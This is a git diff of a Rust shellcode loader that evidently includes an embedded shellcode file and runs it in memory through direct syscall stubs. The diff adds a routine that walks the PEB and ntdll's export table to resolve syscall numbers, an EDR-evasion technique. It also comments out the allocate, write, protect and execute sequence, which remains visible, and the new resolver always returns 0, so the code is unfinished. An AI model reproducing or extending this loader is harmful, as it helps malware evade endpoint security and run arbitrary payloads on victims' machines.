@@ -1,8 +1,18 @@
 #![allow(non_upper_case_globals)]
 
-use std::{arch::global_asm, ffi::c_void, ptr::null_mut};
+use std::{
+    arch::global_asm,
+    ffi::{CStr, c_void},
+    ptr::null_mut,
+};
 
-use ntapi::ntmmapi::NtProtectVirtualMemory;
+use ntapi::{ntldr::LDR_DATA_TABLE_ENTRY, ntpebteb::PTEB};
+use windows_sys::Win32::System::{
+    Diagnostics::Debug::IMAGE_NT_HEADERS64,
+    SystemServices::{
+        IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_SIGNATURE,
+    },
+};
 
 const SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");
 
@@ -67,59 +77,175 @@ global_asm!(
 
 type ShellcodeFn = unsafe extern "C" fn() -> ();
 
+fn get_current_teb() -> PTEB {
+    let mut teb: PTEB = null_mut();
+    unsafe {
+        #[cfg(target_arch = "x86_64")]
+        std::arch::asm!(
+            "mov {}, gs:[0x30]",
+            out(reg) teb
+        );
+        #[cfg(target_arch = "x86")]
+        std::arch::asm!(
+            "mov {}, fs:[0x18]",
+            out(reg) teb
+        );
+        teb
+    }
+}
+
+fn get_export_directory(
+    ntdll_base: *mut c_void,
+    export_directory: &mut *mut IMAGE_EXPORT_DIRECTORY,
+) -> bool {
+    unsafe {
+        let dos_header = ntdll_base as *const IMAGE_DOS_HEADER;
+
+        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
+            println!("[-] Invalid DOS header");
+            return false;
+        }
+
+        let nt_headers =
+            ntdll_base.add((*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
+
+        if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
+            println!("[-] Invalid NT header");
+            return false;
+        }
+
+        *export_directory = ntdll_base
+            .add((*nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress as usize)
+            as *mut IMAGE_EXPORT_DIRECTORY;
+
+        if export_directory.is_null() {
+            println!("[-] Invalid export directory");
+            return false;
+        }
+
+        return true;
+    }
+}
+
+fn get_ssn(func_name: &str) -> u32 {
+    unsafe {
+        let teb = get_current_teb();
+        let peb = teb.read().ProcessEnvironmentBlock;
+
+        if teb.is_null() || peb.is_null() || peb.read().OSMajorVersion != 10 {
+            println!("[-] Invalid PEB");
+            return 0;
+        }
+
+        let ldr_data_entry = (peb
+            .read()
+            .Ldr
+            .read()
+            .InMemoryOrderModuleList
+            .Flink
+            .read()
+            .Flink as *const u8)
+            .offset(-0x10) as *const LDR_DATA_TABLE_ENTRY;
+
+        let ntdll_base = ldr_data_entry.read().DllBase as *mut c_void;
+        println!("[+] ntdll.dll base address: {:p}", ntdll_base);
+
+        let mut export_directory: *mut IMAGE_EXPORT_DIRECTORY = null_mut();
+        if !get_export_directory(ntdll_base, &mut export_directory) {
+            println!("[-] Failed to get export directory");
+            return 0;
+        }
+
+        let address_of_functions =
+            ntdll_base.add((*export_directory).AddressOfFunctions as usize) as *const u32;
+        let address_of_names =
+            ntdll_base.add((*export_directory).AddressOfNames as usize) as *const u32;
+        let address_of_name_ordinals =
+            ntdll_base.add((*export_directory).AddressOfNameOrdinals as usize) as *const u16;
+
+        for i in 0..(*export_directory).NumberOfNames as isize {
+            let function_name =
+                (ntdll_base as *const u8).add(*address_of_names.offset(i) as usize) as *const i8;
+
+            let ordinal = *address_of_name_ordinals.offset(i) as usize;
+
+            if ordinal >= (*export_directory).NumberOfFunctions as usize {
+                continue;
+            }
+
+            let function_rva = *address_of_functions.offset(ordinal as isize);
+            let function_addr = ntdll_base.add(function_rva as usize);
+
+            let c_str = CStr::from_ptr(function_name);
+
+            if let Ok(function_str) = c_str.to_str() {
+                if func_name.eq_ignore_ascii_case(function_str) {
+                    println!(
+                        "[+] Found function: {} at {:p}",
+                        function_str, function_addr
+                    );
+                }
+            }
+        }
+    }
+    0
+}
+
 fn main() {
     unsafe {
-        let mut base_address: *mut _ = null_mut();
-        let mut size = SHELLCODE.len();
-        let status = Sys_NtAllocateVirtualMemory(
-            NtCurrentProcess,
-            &mut base_address,
-            0,
-            &mut size,
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE,
-        );
+        let ssn = get_ssn("NtAllocateVirtualMemory");
 
-        if status != 0 {
-            println!("[-] Failed to allocate memory: 0x{:X}", status);
-            return;
-        }
+        // let mut base_address: *mut _ = null_mut();
+        // let mut size = SHELLCODE.len();
+        // let status = Sys_NtAllocateVirtualMemory(
+        //     NtCurrentProcess,
+        //     &mut base_address,
+        //     0,
+        //     &mut size,
+        //     MEM_COMMIT | MEM_RESERVE,
+        //     PAGE_READWRITE,
+        // );
 
-        println!("[+] Allocated {} bytes at {:p}", size, base_address);
+        // if status != 0 {
+        //     println!("[-] Failed to allocate memory: 0x{:X}", status);
+        //     return;
+        // }
 
-        let mut bytes_written = 0;
-        let status = Sys_NtWriteVirtualMemory(
-            NtCurrentProcess,
-            base_address,
-            SHELLCODE.as_ptr() as *mut c_void,
-            SHELLCODE.len(),
-            &mut bytes_written,
-        );
+        // println!("[+] Allocated {} bytes at {:p}", size, base_address);
 
-        if status != 0 {
-            println!("[-] Failed to write shellcode: 0x{:X}", status);
-            return;
-        }
+        // let mut bytes_written = 0;
+        // let status = Sys_NtWriteVirtualMemory(
+        //     NtCurrentProcess,
+        //     base_address,
+        //     SHELLCODE.as_ptr() as *mut c_void,
+        //     SHELLCODE.len(),
+        //     &mut bytes_written,
+        // );
 
-        println!("[+] Wrote {} bytes of shellcode", bytes_written);
+        // if status != 0 {
+        //     println!("[-] Failed to write shellcode: 0x{:X}", status);
+        //     return;
+        // }
 
-        let mut old_protect: u32 = 0;
-        let status = Sys_NtProtectVirtualMemory(
-            NtCurrentProcess,
-            &mut base_address,
-            &mut size,
-            PAGE_EXECUTE_READ,
-            &mut old_protect,
-        );
+        // println!("[+] Wrote {} bytes of shellcode", bytes_written);
 
-        if status != 0 {
-            println!("[-] Failed to change memory protection: 0x{:X}", status);
-            return;
-        }
+        // let mut old_protect: u32 = 0;
+        // let status = Sys_NtProtectVirtualMemory(
+        //     NtCurrentProcess,
+        //     &mut base_address,
+        //     &mut size,
+        //     PAGE_EXECUTE_READ,
+        //     &mut old_protect,
+        // );
 
-        let shellcode_fn: ShellcodeFn = std::mem::transmute(base_address);
-        println!("[+] Executing shellcode...");
-        shellcode_fn();
+        // if status != 0 {
+        //     println!("[-] Failed to change memory protection: 0x{:X}", status);
+        //     return;
+        // }
+
+        // let shellcode_fn: ShellcodeFn = std::mem::transmute(base_address);
+        // println!("[+] Executing shellcode...");
+        // shellcode_fn();
 
         return;
     }
